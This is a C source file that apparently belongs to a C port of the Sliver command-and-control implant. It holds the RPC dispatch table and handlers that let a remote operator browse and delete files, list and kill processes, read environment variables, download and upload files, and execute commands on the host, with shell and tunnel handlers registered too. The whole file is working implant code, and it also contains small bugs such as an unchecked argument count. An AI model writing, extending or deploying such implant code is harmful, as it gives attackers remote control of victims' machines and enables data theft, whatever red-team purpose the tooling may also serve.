/* src/rpc/dispatch.c - handler table and the first slice of Sliver RPCs. */
#include "sliver/rpc.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/fs.h"
#include "sliver/log.h"
#include "sliver/proc.h"

#define SLIVER_LS_MAX_ENTRIES 4096

typedef int (*rpc_handler_fn)(const sliver_envelope_t *req, sliver_buf_t *out);

typedef struct {
  uint32_t req_type;
  uint32_t resp_type;
  rpc_handler_fn fn;
} rpc_entry_t;

/* --- Ls ---------------------------------------------------------------- */
typedef struct {
  sliver_file_info_t *files;
  size_t count;
  size_t cap;
  int overflow;
} ls_ctx_t;

static int ls_collect(const sliver_dir_entry_t *entry, void *ctx) {
  ls_ctx_t *c = (ls_ctx_t *)ctx;
  sliver_file_info_t *slot;

  if (c->count >= c->cap) {
    c->overflow = 1;
    return 1; /* stop iterating */
  }
  slot = &c->files[c->count++];
  memset(slot, 0, sizeof(*slot));
  (void)strncpy(slot->name, entry->name, sizeof(slot->name) - 1);
  slot->is_dir = entry->is_dir;
  slot->size = entry->size;
  slot->mtime = entry->mtime;
  (void)strncpy(slot->mode, entry->mode, sizeof(slot->mode) - 1);
  (void)strncpy(slot->link, entry->link, sizeof(slot->link) - 1);
  return 0;
}

int sliver_rpc_handle_ls(const sliver_envelope_t *req, sliver_buf_t *out) {
  char path[1024];
  char cwd[1024];
  char absolute[1024];
  ls_ctx_t ctx;
  int exists;
  int rc;

  if (sliver_ls_req_decode(req->data, req->data_len, path, sizeof(path)) != 0) {
    return -1;
  }
  if (path[0] == '\0') {
    if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
      return -1;
    }
    (void)strncpy(path, cwd, sizeof(path) - 1);
    path[sizeof(path) - 1] = '\0';
  }
  exists = sliver_fs_exists(path);

  ctx.files = (sliver_file_info_t *)calloc(SLIVER_LS_MAX_ENTRIES, sizeof(sliver_file_info_t));
  ctx.count = 0;
  ctx.cap = SLIVER_LS_MAX_ENTRIES;
  ctx.overflow = 0;
  if (ctx.files == NULL) {
    return -1;
  }
  if (exists) {
    (void)sliver_fs_list(path, ls_collect, &ctx);
  }
  if (ctx.overflow) {
    LOG_WARN("rpc: ls truncated at %d entries", SLIVER_LS_MAX_ENTRIES);
  }

  /* Report the absolute path back, like the Go implant does. */
  if (sliver_fs_abspath(path, absolute, sizeof(absolute)) != 0) {
    (void)strncpy(absolute, path, sizeof(absolute) - 1);
    absolute[sizeof(absolute) - 1] = '\0';
  }
  rc = sliver_ls_encode(out, absolute, exists, ctx.files, ctx.count);
  free(ctx.files);
  return rc;
}

/* --- Pwd --------------------------------------------------------------- */
int sliver_rpc_handle_pwd(const sliver_envelope_t *req, sliver_buf_t *out) {
  char cwd[1024];
  (void)req;
  if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
    return -1;
  }
  return sliver_pwd_encode(out, cwd, NULL);
}

/* --- Cd ---------------------------------------------------------------- */
int sliver_rpc_handle_cd(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char cwd[1024];
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_chdir(p.path) != 0) {
    (void)snprintf(err, sizeof(err), "chdir %s: failed", p.path);
  }
  if (sliver_fs_getcwd(cwd, sizeof(cwd)) != 0) {
    (void)snprintf(cwd, sizeof(cwd), "%s", p.path);
  }
  LOG_DEBUG("rpc: cd '%s' -> %s", p.path, cwd);
  return sliver_pwd_encode(out, cwd, err);
}

/* --- Rm ---------------------------------------------------------------- */
int sliver_rpc_handle_rm(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_remove(p.path, p.recursive, p.force) != 0) {
    (void)snprintf(err, sizeof(err), "rm %s: failed", p.path);
  }
  return sliver_path_resp_encode(out, p.path, err);
}

/* --- Mkdir ------------------------------------------------------------- */
int sliver_rpc_handle_mkdir(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_path_req_t p;
  char err[256];

  if (sliver_path_req_decode(req->data, req->data_len, &p) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_fs_mkdir(p.path) != 0) {
    (void)snprintf(err, sizeof(err), "mkdir %s: failed", p.path);
  }
  return sliver_path_resp_encode(out, p.path, err);
}

/* --- Ps ---------------------------------------------------------------- */
int sliver_rpc_handle_ps(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_proc_t *procs = NULL;
  sliver_proc_info_t *infos = NULL;
  size_t count = 0;
  size_t i;
  int rc;

  (void)req;
  if (sliver_proc_list(&procs, &count) != 0) {
    return sliver_ps_encode(out, NULL, 0, "ps: cannot enumerate processes");
  }
  infos = (sliver_proc_info_t *)calloc(count == 0 ? 1 : count, sizeof(sliver_proc_info_t));
  if (infos == NULL) {
    sliver_proc_free(procs);
    return -1;
  }
  for (i = 0; i < count; ++i) {
    infos[i].pid = procs[i].pid;
    infos[i].ppid = procs[i].ppid;
    infos[i].exe = procs[i].exe;
    infos[i].owner = procs[i].owner;
    infos[i].session_id = procs[i].session_id;
    infos[i].cmdline = procs[i].cmdline;
    infos[i].arch = procs[i].arch;
  }
  rc = sliver_ps_encode(out, infos, count, NULL);
  free(infos);
  sliver_proc_free(procs);
  return rc;
}

/* --- Terminate --------------------------------------------------------- */
int sliver_rpc_handle_terminate(const sliver_envelope_t *req, sliver_buf_t *out) {
  int32_t pid = 0;
  int force = 0;
  char err[128];

  if (sliver_terminate_req_decode(req->data, req->data_len, &pid, &force) != 0) {
    return -1;
  }
  err[0] = '\0';
  if (sliver_proc_terminate(pid, force) != 0) {
    (void)snprintf(err, sizeof(err), "terminate %d: failed", (int)pid);
  }
  return sliver_terminate_encode(out, pid, err);
}

/* --- Env --------------------------------------------------------------- */
int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_env_t *vars = NULL;
  sliver_env_pair_t *pairs = NULL;
  size_t count = 0;
  size_t i;
  int rc;

  (void)req;
  if (sliver_env_list(&vars, &count) != 0) {
    return sliver_env_encode(out, NULL, 0, "env: cannot read environment");
  }
  pairs = (sliver_env_pair_t *)calloc(count == 0 ? 1 : count, sizeof(sliver_env_pair_t));
  if (pairs == NULL) {
    sliver_env_free(vars);
    return -1;
  }
  for (i = 0; i < count; ++i) {
    pairs[i].key = vars[i].key;
    pairs[i].value = vars[i].value;
  }
  rc = sliver_env_encode(out, pairs, count, NULL);
  free(pairs);
  sliver_env_free(vars);
  return rc;
}

/* --- Download ---------------------------------------------------------- */
int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_download_req_t dl;
  sliver_buf_t chunk;
  int64_t limit = SLIVER_DOWNLOAD_CHUNK;
  int64_t stop = 0;
  int exists;
  int rc;

  if (sliver_download_req_decode(req->data, req->data_len, &dl) != 0) {
    return -1;
  }
  sliver_buf_init(&chunk);
  exists = sliver_fs_exists(dl.path);
  if (exists) {
    if (dl.stop > dl.start && dl.stop - dl.start < limit) {
      limit = dl.stop - dl.start;
    }
    (void)sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk);
    stop = dl.start + (int64_t)chunk.len;
  } else {
    stop = dl.start;
  }
  rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, 0,
                              exists ? NULL : "download: no such file");
  sliver_buf_free(&chunk);
  return rc;
}

/* --- Upload ------------------------------------------------------------ */
int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_upload_req_t up;
  char err[256];
  int ok;

  if (sliver_upload_req_decode(req->data, req->data_len, &up) != 0) {
    return -1;
  }
  err[0] = '\0';
  ok = sliver_fs_write_chunk(up.path, up.data, up.data_len, up.overwrite) == 0;
  if (!ok) {
    (void)snprintf(err, sizeof(err), "upload %s: write failed (errno %d, len %u)", up.path,
                   errno, (unsigned)up.data_len);
  }
  return sliver_upload_encode(out, up.path, ok ? 1 : 0, ok ? 0 : 1, err);
}

/* --- Execute ----------------------------------------------------------- */
int sliver_rpc_handle_execute(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_execute_req_t ex;
  const char *argv[SLIVER_EXEC_MAX_ARGS];
  sliver_buf_t stdout_buf;
  sliver_buf_t stderr_buf;
  uint32_t pid = 0;
  uint32_t status = 0;
  size_t i;
  int rc;

  if (sliver_execute_req_decode(req->data, req->data_len, &ex) != 0) {
    return -1;
  }
  for (i = 0; i < ex.argc; ++i) {
    argv[i] = ex.args[i];
  }
  sliver_buf_init(&stdout_buf);
  sliver_buf_init(&stderr_buf);
  if (sliver_proc_exec(ex.path, argv, ex.argc, ex.output, &stdout_buf, &stderr_buf, &pid,
                       &status) != 0) {
    sliver_buf_free(&stdout_buf);
    sliver_buf_free(&stderr_buf);
    return sliver_execute_encode(out, 1, NULL, 0, NULL, 0, 0,
                                 "execute: cannot start process");
  }
  LOG_DEBUG("rpc: execute %s -> pid %u status %u (%u/%u bytes)", ex.path, pid, status,
            (unsigned)stdout_buf.len, (unsigned)stderr_buf.len);
  rc = sliver_execute_encode(out, status, stdout_buf.data, stdout_buf.len, stderr_buf.data,
                             stderr_buf.len, pid, NULL);
  sliver_buf_free(&stdout_buf);
  sliver_buf_free(&stderr_buf);
  return rc;
}

/* --- table ------------------------------------------------------------- */
static const rpc_entry_t g_handlers[] = {
    {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
    {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
    {SLIVER_MSG_CD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_cd},
    {SLIVER_MSG_RM_REQ, SLIVER_MSG_RM, sliver_rpc_handle_rm},
    {SLIVER_MSG_MKDIR_REQ, SLIVER_MSG_MKDIR, sliver_rpc_handle_mkdir},
    {SLIVER_MSG_PS_REQ, SLIVER_MSG_PS, sliver_rpc_handle_ps},
    {SLIVER_MSG_TERMINATE_REQ, SLIVER_MSG_TERMINATE, sliver_rpc_handle_terminate},
    {SLIVER_MSG_ENV_REQ, SLIVER_MSG_ENV, sliver_rpc_handle_env},
    {SLIVER_MSG_DOWNLOAD_REQ, SLIVER_MSG_DOWNLOAD, sliver_rpc_handle_download},
    {SLIVER_MSG_UPLOAD_REQ, SLIVER_MSG_UPLOAD, sliver_rpc_handle_upload},
    {SLIVER_MSG_EXECUTE_REQ, SLIVER_MSG_EXECUTE_REQ, sliver_rpc_handle_execute},
    {SLIVER_MSG_SHELL_REQ, SLIVER_MSG_SHELL, sliver_rpc_handle_shell},
    {SLIVER_MSG_TUNNEL_DATA, 0, sliver_rpc_handle_tunnel_data},
    {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
    {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
};

void sliver_rpc_result_free(sliver_rpc_result_t *result) {
  if (result == NULL) {
    return;
  }
  sliver_buf_free(&result->message);
  result->handled = 0;
  result->resp_type = 0;
}

void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *result) {
  size_t i;

  if (result == NULL) {
    return;
  }
  sliver_buf_init(&result->message);
  result->handled = 0;
  result->resp_type = 0;
  if (req == NULL) {
    return;
  }
  for (i = 0; i < sizeof(g_handlers) / sizeof(g_handlers[0]); ++i) {
    if (g_handlers[i].req_type != req->type) {
      continue;
    }
    {
      int hrc = g_handlers[i].fn(req, &result->message);
      result->handled = 1;
      if (hrc == -2) {
        /* Handler replied (or deliberately stayed silent) itself. */
        result->no_response = 1;
        result->resp_type = 0;
        sliver_buf_free(&result->message);
        sliver_buf_init(&result->message);
      } else if (hrc == 0) {
        result->resp_type = g_handlers[i].resp_type;
      } else {
        LOG_ERROR("rpc: handler for type %u failed", req->type);
        result->resp_type = g_handlers[i].resp_type;
        sliver_buf_free(&result->message);
        sliver_buf_init(&result->message);
      }
    }
    return;
  }
}



